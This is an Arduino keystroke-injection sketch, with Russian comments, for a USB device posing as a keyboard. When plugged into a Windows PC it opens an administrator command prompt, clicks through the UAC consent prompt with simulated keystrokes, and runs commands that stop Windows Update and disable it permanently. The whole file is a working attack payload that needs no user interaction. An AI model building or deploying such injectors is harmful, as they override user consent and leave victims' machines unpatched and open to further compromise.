#include <Keyboard.h>

void setup() {
  // Ожидание инициализации
  delay(5000);

  // Открытие "Выполнить"
  Keyboard.press(KEY_LEFT_GUI);  // Нажатие Win
  delay(100);
  Keyboard.press('r');           // Нажатие на 'r'
  delay(100);
  Keyboard.releaseAll();         // Освобождение всех клавиш

  delay(1000);

  // Ввод "cmd" и открытие командной строки от имени администратора
  Keyboard.print("cmd");
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);    // Нажатие на Ctrl
  Keyboard.press(KEY_LEFT_SHIFT);   // Нажатие на Shift
  Keyboard.press(KEY_RETURN);       // Нажатие на Enter
  delay(300);
  Keyboard.release(KEY_RETURN);     // Освобождение клавиши Enter
  delay(300);
  Keyboard.press(KEY_LEFT_ARROW);   // Нажатие на стрелку влево
  delay(100);
  Keyboard.release(KEY_LEFT_ARROW); // Освобождение стрелки влево
  delay(300);
  Keyboard.press(KEY_RETURN);       // Нажатие на Enter
  delay(300);
  Keyboard.releaseAll();            // Освобождение всех клавиш

  delay(1000);

  // Отключение Windows Update
  Keyboard.print("sc stop wuauserv");
  delay(100);
  Keyboard.press(KEY_RETURN);    // Нажатие на Enter
  delay(100);
  Keyboard.releaseAll();         // Освобождение всех клавиш

  delay(1000);

  Keyboard.print("sc config wuauserv start= disabled");
  delay(100);
  Keyboard.press(KEY_RETURN);    // Нажатие на Enter
  delay(100);
  Keyboard.releaseAll();         // Освобождение всех клавиш

  delay(1000);

  Keyboard.print("exit");        // Закрытие командной строки
  delay(100);
  Keyboard.press(KEY_RETURN);    // Нажатие на Enter
  delay(100);
  Keyboard.releaseAll();         // Освобождение всех клавиш
}

void loop() {
  // Пустой цикл, так как мы выполняем действия только в setup()
}
